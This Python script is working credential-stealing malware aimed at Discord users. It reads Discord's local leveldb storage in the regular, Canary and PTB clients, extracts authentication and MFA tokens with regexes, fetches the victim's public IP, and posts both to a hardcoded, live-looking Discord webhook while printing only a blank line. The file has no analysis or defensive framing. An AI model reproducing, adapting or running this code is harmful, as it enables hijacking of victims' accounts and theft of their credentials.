import os
import re
import json
import requests
from datetime import datetime

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1370231956520042527/c6jJTim4f1IUXtOnKzsQeyAnifKMshO2LadA_LaLZjRdOGWyIEBBmHvSsHt69t59F3QW"  

def fdt():
    t = []
    p = [os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb')]
    for pa in p:
        if not os.path.exists(pa):
            continue
        for fn in os.listdir(pa):
            if not fn.endswith('.log') and not fn.endswith('.ldb'):
                continue
            for li in [x.strip() for x in open(os.path.join(pa, fn), errors='ignore').readlines() if x.strip()]:
                for rx in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for tk in re.findall(rx, li):
                        t.append(tk)
    return list(set(t))

def gia():
    try:
        r = requests.get('https://api.ipify.org?format=json')
        r.raise_for_status()
        return r.json()['ip']
    except requests.exceptions.RequestException:
        return None

def send_to_discord(tokens, ip_address):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    content = f"""
    **Discord Info Found!**
    Timestamp: {timestamp}
    **Discord Tokens:**
    ```
    {'\\n'.join(tokens) if tokens else 'No tokens found.'}
    ```
    **IP Address:** {ip_address if ip_address else 'N/A'}
    """

    payload = {
        "content": content
    }

    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
        response.raise_for_status()
        print(" ")
    except requests.exceptions.RequestException as e:
        print(f"Error sending to Discord: {e}")

if __name__ == "__main__":
    tokens = fdt()
    ip_address = gia()

    if tokens or ip_address:
        send_to_discord(tokens, ip_address)
    else:
        print("No new information found.")
